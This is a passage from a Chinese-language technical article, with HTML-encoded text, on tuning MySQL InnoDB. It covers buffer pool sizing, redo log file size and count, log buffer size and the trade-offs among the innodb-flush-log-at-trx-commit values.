&#x8FD8;&#x4F7F;&#x7528;&#x7F13;&#x51B2;&#x6C60;&#x6765;&#x5E2E;&#x52A9;&#x5EF6;&#x8FDF;&#x5199;&#x5165;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x5408;&#x5E76;&#x591A;&#x4E2A;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x8D77;&#x987A;&#x5E8F;&#x5199;&#x5165;&#xFF0C;&#x63D0;&#x5347;&#x6027;&#x80FD;&#x3002;&#x603B;&#x4E4B;&#xFF0C;InnoDB &#x4E25;&#x91CD;&#x4F9D;&#x8D56;&#x7F13;&#x51B2;&#x6C60;&#xFF0C;&#x5FC5;&#x987B;&#x4E3A;&#x5176;&#x5206;&#x914D;&#x8DB3;&#x591F;&#x7684;&#x5185;&#x5B58;&#x3002;</p><p>&#x5F53;&#x7136;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x636E;&#x91CF;&#x4E0D;&#x5927;&#x4E14;&#x4E0D;&#x4F1A;&#x5FEB;&#x901F;&#x589E;&#x957F;&#xFF0C;&#x5C31;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x4E3A;&#x7F13;&#x51B2;&#x6C60;&#x5206;&#x914D;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x628A;&#x7F13;&#x51B2;&#x6C60;&#x914D;&#x7F6E;&#x5F97;&#x6BD4;&#x9700;&#x8981;&#x7F13;&#x5B58;&#x7684;&#x8868;&#x548C;&#x7D22;&#x5F15;&#x8FD8;&#x8981;&#x5927;&#x5F88;&#x591A;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x4E5F;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x610F;&#x4E49;&#x3002;&#x5F88;&#x5927;&#x7684;&#x7F13;&#x51B2;&#x6C60;&#x4E5F;&#x4F1A;&#x5E26;&#x6765;&#x4E00;&#x4E9B;&#x6311;&#x6218;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x9884;&#x70ED;&#x548C;&#x5173;&#x95ED;&#x90FD;&#x4F1A;&#x82B1;&#x8D39;&#x5F88;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5982;&#x679C;&#x6709;&#x5F88;&#x591A;&#x810F;&#x9875;&#x5728;&#x7F13;&#x51B2;&#x6C60;&#x91CC;&#xFF0C;InnoDB &#x5173;&#x95ED;&#x65F6;&#x53EF;&#x80FD;&#x4F1A;&#x82B1;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#x6765;&#x628A;&#x810F;&#x9875;&#x5199;&#x56DE;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x3002;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x5173;&#x95ED;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x542F;&#x52A8;&#x65F6;&#x9700;&#x8981;&#x505A;&#x66F4;&#x591A;&#x7684;&#x6062;&#x590D;&#x5DE5;&#x4F5C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x540C;&#x65F6;&#x52A0;&#x901F;&#x5173;&#x95ED;&#x548C;&#x91CD;&#x542F;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x3002;&#x5F53;&#x6709;&#x4E00;&#x4E2A;&#x5F88;&#x5927;&#x7684;&#x7F13;&#x51B2;&#x6C60;&#xFF0C;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x9700;&#x8981;&#x82B1;&#x8D39;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#xFF08;&#x51E0;&#x5C0F;&#x65F6;&#x6216;&#x8005;&#x51E0;&#x5929;&#xFF09;&#x6765;&#x9884;&#x70ED;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x78C1;&#x76D8;&#x5F88;&#x6162;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x52A0;&#x5FEB;&#x9884;&#x70ED;&#x65F6;&#x95F4;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x91CD;&#x542F;&#x540E;&#x7ACB;&#x523B;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x6216;&#x8005;&#x7D22;&#x5F15;&#x626B;&#x63CF;&#xFF0C;&#x628A;&#x7D22;&#x5F15;&#x8F7D;&#x5165;&#x7F13;&#x51B2;&#x6C60;&#x3002;</p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x793A;&#x4F8B;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x628A;&#x8FD9;&#x4E2A;&#x503C;&#x914D;&#x7F6E;&#x4E3A; 12G&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x6807;&#x51C6;&#x914D;&#x7F6E;&#xFF0C;&#x9700;&#x8981;&#x6839;&#x636E;&#x5177;&#x4F53;&#x7684;&#x786C;&#x4EF6;&#x6765;&#x4F30;&#x7B97;&#x3002;&#x90A3;&#x5982;&#x4F55;&#x4F30;&#x7B97;&#xFF1F;</p><p>&#x524D;&#x9762;&#x7684;&#x5C0F;&#x8282;&#xFF0C;&#x6211;&#x4EEC;&#x8BF4;&#x5230;&#xFF0C;MySQL &#x4E2D;&#x6700;&#x91CD;&#x8981;&#x7684;&#x7F13;&#x5B58;&#x6709; 5 &#x79CD;&#xFF0C;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x516C;&#x5F0F;&#x8BA1;&#x7B97;&#xFF1A;</p><p><em><strong>InnoDB &#x7F13;&#x51B2;&#x6C60; = &#x670D;&#x52A1;&#x5668;&#x603B;&#x5185;&#x5B58; - OS &#x9884;&#x7559; - &#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x5360;&#x7528;&#x5185;&#x5B58; - MySQL &#x81EA;&#x8EAB;&#x9700;&#x8981;&#x7684;&#x5185;&#x5B58; - InnoDB &#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5360;&#x7528;&#x5185;&#x5B58; - &#x5176;&#x5B83;&#x5185;&#x5B58; (MyISAM &#x952E;&#x7F13;&#x5B58;&#x3001;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x7B49;)</strong></em></p><p>&#x5177;&#x4F53;&#x6765;&#x770B;&#xFF0C;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x4E3A; OS &#x4FDD;&#x7559; 1~2G &#x5185;&#x5B58;&#xFF0C;&#x5982;&#x679C;&#x673A;&#x5668;&#x5185;&#x5B58;&#x5927;&#x7684;&#x8BDD;&#x53EF;&#x4EE5;&#x9884;&#x7559;&#x591A;&#x4E00;&#x4E9B;&#xFF0C;&#x5EFA;&#x8BAE; 2GB &#x548C;&#x603B;&#x5185;&#x5B58;&#x7684; 5% &#x4E3A;&#x57FA;&#x51C6;&#xFF0C;&#x4EE5;&#x8F83;&#x5927;&#x8005;&#x4E3A;&#x51C6;&#xFF0C;&#x5982;&#x679C;&#x673A;&#x5668;&#x4E0A;&#x8FD8;&#x8FD0;&#x884C;&#x7740;&#x4E00;&#x4E9B;&#x5185;&#x5B58;&#x5BC6;&#x96C6;&#x578B;&#x4EFB;&#x52A1;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x5907;&#x4EFD;&#x4EFB;&#x52A1;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x4E3A; OS &#x518D;&#x9884;&#x7559;&#x591A;&#x4E00;&#x4E9B;&#x5185;&#x5B58;&#x3002;&#x4E0D;&#x8981;&#x4E3A; OS &#x7F13;&#x5B58;&#x589E;&#x52A0;&#x4EFB;&#x4F55;&#x5185;&#x5B58;&#xFF0C;&#x56E0;&#x4E3A; OS &#x901A;&#x5E38;&#x4F1A;&#x5229;&#x7528;&#x6240;&#x6709;&#x5269;&#x4E0B;&#x7684;&#x5185;&#x5B58;&#x6765;&#x505A;&#x6587;&#x4EF6;&#x7F13;&#x5B58;&#x3002;</p><p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C; MySQL &#x7684;&#x670D;&#x52A1;&#x5668;&#x5F88;&#x5C11;&#x4F1A;&#x8FD0;&#x884C;&#x5176;&#x4ED6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x6709;&#x7684;&#x8BDD;&#xFF0C;&#x8BF7;&#x4E3A;&#x8FD9;&#x4E9B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x9884;&#x7559;&#x8DB3;&#x591F;&#x591A;&#x7684;&#x5185;&#x5B58;&#x3002;</p><p>MySQL &#x81EA;&#x8EAB;&#x8FD0;&#x884C;&#x8FD8;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x5185;&#x5B58;&#xFF0C;&#x4F46;&#x901A;&#x5E38;&#x90FD;&#x4E0D;&#x4F1A;&#x592A;&#x5927;&#x3002;&#x9700;&#x8981;&#x8003;&#x8651; MySQL &#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x9700;&#x8981;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x867D;&#x7136;&#x6BCF;&#x4E2A;&#x8FDE;&#x63A5;&#x9700;&#x8981;&#x7684;&#x5185;&#x5B58;&#x90FD;&#x5F88;&#x5C11;&#xFF0C;&#x4F46;&#x5B83;&#x8FD8;&#x8981;&#x6C42;&#x4E00;&#x4E2A;&#x57FA;&#x672C;&#x91CF;&#x7684;&#x5185;&#x5B58;&#x6765;&#x6267;&#x884C;&#x4EFB;&#x4F55;&#x7ED9;&#x5B9A;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x800C;&#x4E14;&#x67E5;&#x8BE2;&#x8FC7;&#x7A0B;&#x4E2D;&#x8FD8;&#x9700;&#x8981;&#x4E3A;&#x6392;&#x5E8F;&#x3001;GROUP BY &#x7B49;&#x64CD;&#x4F5C;&#x5206;&#x914D;&#x4E34;&#x65F6;&#x8868;&#x5185;&#x5B58;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x4E3A;&#x9AD8;&#x5CF0;&#x671F;&#x6267;&#x884C;&#x5927;&#x91CF;&#x7684;&#x67E5;&#x8BE2;&#x9884;&#x7559;&#x8DB3;&#x591F;&#x7684;&#x5185;&#x5B58;&#x3002;&#x8FD9;&#x4E2A;&#x5185;&#x5B58;&#x6709;&#x591A;&#x5927;&#xFF1F;&#x53EA;&#x80FD;&#x5728;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x76D1;&#x63A7;&#x3002;</p><p>&#x5982;&#x679C;&#x5927;&#x90E8;&#x5206;&#x8868;&#x90FD;&#x662F; InnoDB&#xFF0C;MyISAM &#x952E;&#x7F13;&#x5B58;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x5F88;&#x5C0F;&#x503C;&#x8DB3;&#x77E3;&#xFF0C;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x4E5F;&#x5EFA;&#x8BAE;&#x5173;&#x95ED;&#x3002;</p><p>&#x516C;&#x5F0F;&#x4E2D;&#x5C31;&#x5269;&#x4E0B; InnoDB &#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x4E86;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x63A5;&#x4E0B;&#x6765;&#x8981;&#x8BF4;&#x7684;&#x3002;</p><p><strong>innodb-log-file-size &amp;&amp; innodb-log-files-in-group</strong></p><p>&#x5982;&#x679C;&#x5BF9; InnoDB &#x6570;&#x636E;&#x8868;&#x6709;&#x5927;&#x91CF;&#x7684;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;innodb-log-file-size&#x503C;&#x5BF9;&#x63D0;&#x5347; MySQL &#x6027;&#x80FD;&#x5F88;&#x91CD;&#x8981;&#x3002;InnoDB &#x4F7F;&#x7528;&#x65E5;&#x5FD7;&#x6765;&#x51CF;&#x5C11;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x65F6;&#x7684;&#x5F00;&#x9500;&#x3002;&#x65E5;&#x5FD7;&#x4E2D;&#x8BB0;&#x5F55;&#x4E86;&#x4E8B;&#x52A1;&#xFF0C;&#x5C31;&#x65E0;&#x987B;&#x5728;&#x6BCF;&#x4E2A;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x65F6;&#x628A;&#x7F13;&#x51B2;&#x6C60;&#x7684;&#x810F;&#x5757; (&#x7F13;&#x5B58;&#x4E2D;&#x4E0E;&#x78C1;&#x76D8;&#x4E0A;&#x6570;&#x636E;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x9875;) &#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#x3002;&#x4E8B;&#x52A1;&#x4FEE;&#x6539;&#x7684;&#x6570;&#x636E;&#x548C;&#x7D22;&#x5F15;&#x901A;&#x5E38;&#x4F1A;&#x6620;&#x5C04;&#x5230;&#x8868;&#x7A7A;&#x95F4;&#x7684;&#x968F;&#x673A;&#x4F4D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x5237;&#x65B0;&#x8FD9;&#x4E9B;&#x53D8;&#x66F4;&#x5230;&#x78C1;&#x76D8;&#x9700;&#x8981;&#x5F88;&#x591A;&#x968F;&#x673A; I/O&#x3002;&#x4E00;&#x65E6;&#x65E5;&#x5FD7;&#x5B89;&#x5168;&#x7684;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF0C;&#x4E8B;&#x52A1;&#x5C31;&#x6301;&#x4E45;&#x5316;&#x4E86;&#xFF0C;&#x5373;&#x4F7F;&#x53D8;&#x66F4;&#x8FD8;&#x6CA1;&#x6709;&#x5199;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x5728;&#x4E00;&#x4E9B;&#x610F;&#x5916;&#x60C5;&#x51B5;&#x53D1;&#x751F;&#x65F6; (&#x6BD4;&#x5982;&#x65AD;&#x7535;&#x4E86;)&#xFF0C;InnoDB &#x53EF;&#x4EE5;&#x91CD;&#x653E;&#x65E5;&#x5FD7;&#x5E76;&#x4E14;&#x6062;&#x590D;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x3002;</p><p>InnoDB &#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7EBF;&#x7A0B;&#x667A;&#x80FD;&#x5730;&#x5237;&#x65B0;&#x8FD9;&#x4E9B;&#x53D8;&#x66F4;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x3002;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x628A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x7684;&#x968F;&#x673A; I/O &#x8F6C;&#x6362;&#x4E3A;&#x51E0;&#x4E4E;&#x987A;&#x5E8F;&#x5730;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x548C;&#x6570;&#x636E;&#x6587;&#x4EF6; I/O&#xFF0C;&#x8BA9;&#x5237;&#x65B0;&#x64CD;&#x4F5C;&#x5728;&#x540E;&#x53F0;&#x53EF;&#x4EE5;&#x66F4;&#x5FEB;&#x7684;&#x5B8C;&#x6210;&#xFF0C;&#x5E76;&#x4E14;&#x7F13;&#x5B58; I/O &#x538B;&#x529B;&#x3002;</p><p>&#x6574;&#x4F53;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x53D7;&#x63A7;&#x4E8E;<code>innodb-log-file-size</code>&#x548C;<code>innodb-log-files-in-group</code>&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x5BF9;&#x5199;&#x6027;&#x80FD;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x3002;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x603B;&#x5927;&#x5C0F;&#x662F;&#x6BCF;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#x4E4B;&#x548C;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53EA;&#x6709;&#x4E24;&#x4E2A; 5M &#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x603B;&#x5171; 10M&#xFF0C;&#x5BF9;&#x9AD8;&#x6027;&#x80FD;&#x5DE5;&#x4F5C;&#x6765;&#x8BF4;&#x592A;&#x5C0F;&#x4E86;&#xFF0C;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x51E0;&#x767E; M &#x6216;&#x8005;&#x4E0A; G &#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;<code>innodb-log-files-in-group</code>&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5B83;&#x63A7;&#x5236;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x4ECE;&#x540D;&#x5B57;&#x4E0A;&#x770B;&#x597D;&#x4F3C;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x65E5;&#x5FD7;&#x7EC4;&#x6709;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;log group&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x91CD;&#x505A;&#x65E5;&#x5FD7;&#x7684;&#x6587;&#x4EF6;&#x96C6;&#x5408;&#xFF0C;&#x6CA1;&#x6709;&#x53C2;&#x6570;&#x4E5F;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x914D;&#x7F6E;&#x6709;&#x591A;&#x5C11;&#x4E2A;&#x65E5;&#x5FD7;&#x7EC4;&#x3002;</p><p>&#x4FEE;&#x6539;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x9700;&#x8981;&#x5B8C;&#x5168;&#x5173;&#x95ED; MySQL&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x65E7;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x8FC1;&#x79FB;&#x5230;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#xFF0C;&#x91CD;&#x65B0;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;&#x3002;&#x91CD;&#x542F;&#x65F6;&#x9700;&#x8981;&#x5C06;&#x65E7;&#x7684;&#x65E5;&#x5FD7;&#x8FC1;&#x79FB;&#x56DE;&#x6765;&#xFF0C;&#x7136;&#x540E;&#x7B49;&#x5F85; MySQL &#x6062;&#x590D;&#x6570;&#x636E;&#x540E;&#xFF0C;&#x518D;&#x5220;&#x9664;&#x65E7;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x8BF7;&#x4E00;&#x5B9A;&#x8981;&#x67E5;&#x770B;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x786E;&#x8BA4; MySQL &#x91CD;&#x542F;&#x6210;&#x529F;&#x540E;&#x518D;&#x5220;&#x9664;&#x65E7;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;</p><p>&#x60F3;&#x8981;&#x786E;&#x5B9A;&#x7406;&#x60F3;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#xFF0C;&#x9700;&#x8981;&#x6743;&#x8861;&#x6B63;&#x5E38;&#x6570;&#x636E;&#x53D8;&#x66F4;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x4EE5;&#x53CA;&#x5D29;&#x6E83;&#x65F6;&#x6062;&#x590D;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x592A;&#x5C0F;&#xFF0C;InnoDB &#x5C06;&#x5FC5;&#x987B;&#x8981;&#x505A;&#x66F4;&#x591A;&#x7684;&#x68C0;&#x67E5;&#x70B9;&#xFF0C;&#x5BFC;&#x81F4;&#x66F4;&#x591A;&#x7684;&#x65E5;&#x5FD7;&#x5199;&#xFF0C;&#x5728;&#x6781;&#x4E2A;&#x522B;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5199;&#x8BED;&#x53E5;&#x8FD8;&#x4F1A;&#x88AB;&#x62D6;&#x7D2F;&#xFF0C;&#x5728;&#x65E5;&#x5FD7;&#x6CA1;&#x6709;&#x7A7A;&#x95F4;&#x7EE7;&#x7EED;&#x5199;&#x5165;&#x524D;&#xFF0C;&#x5FC5;&#x987B;&#x7B49;&#x5F85;&#x53D8;&#x66F4;&#x88AB;&#x5237;&#x65B0;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x3002;&#x53E6;&#x4E00;&#x65B9;&#x9762;&#xFF0C;&#x5982;&#x679C;&#x65E5;&#x5FD7;&#x592A;&#x5927;&#xFF0C;&#x5728;&#x5D29;&#x6E83;&#x65F6;&#x6062;&#x590D;&#x5C31;&#x5F97;&#x505A;&#x5927;&#x91CF;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x8FD9;&#x53EF;&#x80FD;&#x589E;&#x5927;&#x6062;&#x590D;&#x65F6;&#x95F4;&#x3002;InnoDB &#x4F1A;&#x91C7;&#x7528; checkpoint &#x673A;&#x5236;&#x6765;&#x5237;&#x65B0;&#x548C;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x4F1A;&#x52A0;&#x5FEB;&#x6062;&#x590D;&#x6570;&#x636E;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;</p><ul><li><a href="http://www.cnblogs.com/cuisi/p/6590281.html" target="_blank" rel="noopener">MySQL-checkpoint &#x6280;&#x672F;</a></li><li><a href="https://www.xaprb.com/blog/2011/01/29/how-innodb-performs-a-checkpoint/" target="_blank" rel="noopener">How InnoDB performs a checkpoint</a></li></ul><p><strong>innodb-flush-log-at-trx-commit</strong></p><p>&#x524D;&#x9762;&#x8BA8;&#x8BBA;&#x4E86;&#x5F88;&#x591A;&#x7F13;&#x5B58;&#xFF0C;InnoDB &#x65E5;&#x5FD7;&#x4E5F;&#x662F;&#x6709;&#x7F13;&#x5B58;&#x7684;&#x3002;&#x5F53; InnoDB &#x53D8;&#x66F4;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x5199;&#x4E00;&#x6761;&#x53D8;&#x66F4;&#x8BB0;&#x5F55;&#x5230;&#x65E5;&#x5FD7;&#x7F13;&#x5B58;&#x533A;&#x3002;&#x5728;&#x7F13;&#x51B2;&#x6162;&#x7684;&#x65F6;&#x5019;&#x3001;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6216;&#x8005;&#x6BCF;&#x4E00;&#x79D2;&#x949F;&#xFF0C;InnoDB &#x90FD;&#x4F1A;&#x5C06;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x65E5;&#x5FD7;&#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x6709;&#x5927;&#x4E8B;&#x52A1;&#xFF0C;&#x589E;&#x52A0;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x533A;&#x5927;&#x5C0F;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x51CF;&#x5C11; I/O&#xFF0C;&#x53D8;&#x91CF;innodb-log-buffer-size&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5927;&#x5C0F;&#x3002;&#x901A;&#x5E38;&#x4E0D;&#x9700;&#x8981;&#x628A;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x533A;&#x8BBE;&#x7F6E;&#x7684;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x6BD5;&#x7ADF;&#x4E0A;&#x8FF0; 3 &#x4E2A;&#x6761;&#x4EF6;&#xFF0C;&#x4EFB;&#x4E00;&#x6761;&#x4EF6;&#x5148;&#x89E6;&#x53D1;&#x90FD;&#x4F1A;&#x628A;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x5185;&#x5BB9;&#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x6240;&#x4EE5;&#x7F13;&#x51B2;&#x533A;&#x7684;&#x6570;&#x636E;&#x80AF;&#x5B9A;&#x4E0D;&#x4F1A;&#x592A;&#x591A;&#xFF0C;&#x51FA;&#x5165;&#x4F60;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x6709;&#x5F88;&#x591A;&#x76F8;&#x5F53;&#x5927;&#x7684; BLOB &#x8BB0;&#x5F55;&#x3002;&#x901A;&#x5E38;&#x6765;&#x8BF4;&#xFF0C;&#x914D;&#x7F6E; 1M~8M &#x5373;&#x53EF;&#x3002;</p><p>&#x65E2;&#x7136;&#x5B58;&#x5728;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x600E;&#x6837;&#x5237;&#x65B0;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5173;&#x6CE8;&#x7684;&#x95EE;&#x9898;&#x3002;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x5FC5;&#x987B;&#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x4EE5;&#x786E;&#x4FDD;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x5B8C;&#x5168;&#x88AB;&#x6301;&#x4E45;&#x5316;&#x3002;&#x5982;&#x679C;&#x548C;&#x6301;&#x4E45;&#x5316;&#x76F8;&#x6BD4;&#xFF0C;&#x66F4;&#x5728;&#x4E4E;&#x6027;&#x80FD;&#xFF0C;&#x53EF;&#x4EE5;&#x4FEE;&#x6539; innodb-flush-log-at-trx-commit &#x53D8;&#x91CF;&#x6765;&#x63A7;&#x5236;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x5237;&#x65B0;&#x7684;&#x9891;&#x7387;&#x3002;</p><ul><li>0&#xFF1A;&#x6BCF; 1 &#x79D2;&#x949F;&#x5C06;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x5199;&#x5230;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5E76;&#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x65F6;&#x4E0D;&#x505A;&#x4EFB;&#x4F55;&#x5904;&#x7406;</li><li>1&#xFF1A;&#x6BCF;&#x6B21;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x65F6;&#xFF0C;&#x5C06;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x5199;&#x5230;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5E76;&#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;</li><li>2&#xFF1A;&#x6BCF;&#x6B21;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x65F6;&#xFF0C;&#x5C06;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x5199;&#x5230;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x79D2;&#x5237;&#x65B0;&#x4E00;&#x6B21;&#x5230;&#x78C1;&#x76D8;</li></ul><blockquote><p>1  &#x662F;&#x6700;&#x5B89;&#x5168;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E0D;&#x4F1A;&#x4E22;&#x5931;&#x4EFB;&#x4F55;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x8BBE;&#x7F6E;&#x3002;</p></blockquote><blockquote><p>0 &#x548C; 2 &#x6700;&#x4E3B;&#x8981;&#x7684;&#x533A;&#x522B;&#x662F;&#xFF0C;&#x5982;&#x679C; MySQL &#x6302;&#x4E86;&#xFF0C;2 &#x4E0D;&#x4F1A;&#x4E22;&#x5931;&#x4E8B;&#x52A1;&#xFF0C;&#x4F46; 0 &#x6709;&#x53EF;&#x80FD;&#xFF0C;</p></blockquote><blockquote><p>2 &#x5728;&#x6BCF;&#x6B21;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x65F6;&#xFF0C;&#x81F3;&#x5C11;&#x5C06;&#x65E5;&#x5FD7;&#x7F13;&#x51B2;&#x5237;&#x65B0;&#x5230;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x800C; 0 